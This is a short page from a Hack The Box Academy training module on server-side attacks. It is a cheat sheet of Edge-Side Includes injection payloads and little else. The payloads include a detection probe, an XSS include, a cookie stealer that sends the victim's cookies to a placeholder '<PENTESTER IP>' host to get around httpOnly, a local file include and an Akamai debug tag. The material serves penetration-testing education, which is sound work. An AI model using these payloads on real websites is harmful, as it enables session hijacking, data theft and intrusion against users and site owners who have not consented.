<!--
 // Platform: Academy
// URL: https://academy.hackthebox.com/module/145/section/1304
// Platform Version: V1
// Module ID: 145
// Module Name: Server-side Attacks
// Module Difficulty: Medium
// Section ID: 1304
// Section Title: Edge-Side Includes (ESI)
// Page Title: Server-side Attacks
// Page Number: 12
-->

# Edge-Side Includes (ESI)

**Module Name:** Server-side Attacks **Page Number:** 12

#### SERVER-SIDE ATTACKS

# Edge-Side Includes (ESI)

#### ESI Tags

``` html
// Basic detection
<esi: include src=http://<PENTESTER IP>>

// XSS Exploitation Example
<esi: include src=http://<PENTESTER IP>/<XSSPAYLOAD.html>>

// Cookie Stealer (bypass httpOnly flag)
<esi: include src=http://<PENTESTER IP>/?cookie_stealer.php?=$(HTTP_COOKIE)>

// Introduce private local files (Not LFI per se)
<esi:include src="supersecret.txt">

// Valid for Akamai, sends debug information in the response
<esi:debug/>
```

####